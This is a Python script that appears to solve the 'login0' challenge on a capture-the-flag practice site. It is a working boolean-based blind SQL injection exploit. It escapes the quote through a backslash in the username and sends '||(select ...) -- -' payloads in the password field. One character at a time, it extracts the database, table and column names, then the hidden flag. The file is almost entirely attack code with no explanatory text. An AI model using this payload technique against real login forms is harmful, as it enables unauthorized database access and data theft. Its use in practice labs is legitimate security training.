import requests
import string

s = requests.session()
url = 'https://hackme.inndy.tw/login0/'
length = 0
chars = string.printable
database = ''
flag = ''
'''
for i in xrange(40):
    payload = "||(select length(database())) = %s -- -" %i
    data = {
        'name': "admin\\",
        'password': payload
    }
    r = s.post(url, data=data)
    #print r.text
    if "You are not admin!" in r.text:
        length = i
        print "database length is %s"%i
        break

for i in range(1, length+1):
    for j in chars:
        payload = "||(select ascii(substring(database(),%s,1))) = %s -- -" %(i, ord(j))
        data = {
            'name': "admin\\",
            'password': payload
        }
        r = s.post(url, data=data)
        #print r.text
        #print "now in %s,%s"%(i,j)
        if "You are not admin!" in r.text:
            database += j
            print "database is %s" % database
            break
'''
# database:login_as_admin0,0x6c6f67696e5f61735f61646d696e30
'''
for i in xrange(100):
    payload = "||(select length(TABLE_NAME) from information_schema.TABLES where table_schema = 0x6c6f67696e5f61735f61646d696e30 limit 0,1 ) = %s -- -" %i
    data = {
        'name': "admin\\",
        'password': payload
    }
    r = s.post(url, data=data)
    #print r.text
    if "You are not admin!" in r.text:
        length = i
        print "tablename length is %s"%i
        break

for i in range(1, length+1):
    for j in chars:
        payload = "||(select ascii(substring(TABLE_NAME, %s, 1)) from information_schema.TABLES where table_schema = 0x6c6f67696e5f61735f61646d696e30 limit 0,1 ) = %s -- -" %(i, ord(j))
        data = {
            'name': "admin\\",
            'password': payload
        }
        r = s.post(url, data=data)
        #print r.text
        #print "now in %s,%s"%(i,j)
        if "You are not admin!" in r.text:
            database += j
            print "tablename is %s" % database
            break
'''
# table:h1dden_f14g 0x68316464656e5f66313467
'''
for i in xrange(100):
    payload = "||(select length(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME = 0x68316464656e5f66313467 limit 0,1) = %s -- -" %i
    data = {
        'name': "admin\\",
        'password': payload
    }
    r = s.post(url, data=data)
    #print r.text
    if "You are not admin!" in r.text:
        length = i
        print "column length is %s"%i
        break

for i in range(1, length+1):
    for j in chars:
        payload = "||(select ascii(substring(COLUMN_NAME, %s, 1)) from information_schema.COLUMNS where TABLE_NAME = 0x68316464656e5f66313467 limit 0,1 ) = %s -- -" %(i, ord(j))
        data = {
            'name': "admin\\",
            'password': payload
        }
        r = s.post(url, data=data)
        #print r.text
        #print "now in %s,%s"%(i,j)
        if "You are not admin!" in r.text:
            database += j
            print "column is %s" % database
            break
'''
# column the_f14g

for i in xrange(100):
    payload = "||(select length(the_f14g) from h1dden_f14g limit 0,1) = %s -- -" % i
    data = {
        'name': "admin\\",
        'password': payload
    }
    r = s.post(url, data=data)
    # print r.text
    if "You are not admin!" in r.text:
        length = i
        print "flag length is %s" % i
        break

flag = ''
for i in range(1, length + 1):
    for j in chars:
        payload = "||(select ascii(substring(the_f14g, %s, 1)) from h1dden_f14g limit 0,1) = %s -- -" % (i, ord(j))
        data = {
            'name': "admin\\",
            'password': payload
        }
        r = s.post(url, data=data)
        # print r.text
        # print "now in %s,%s"%(i,j)
        if "You are not admin!" in r.text:
            flag += j
            # print data
            print "flag is %s" % flag
            # print "flag index %s,%s"%(i,j)
            break
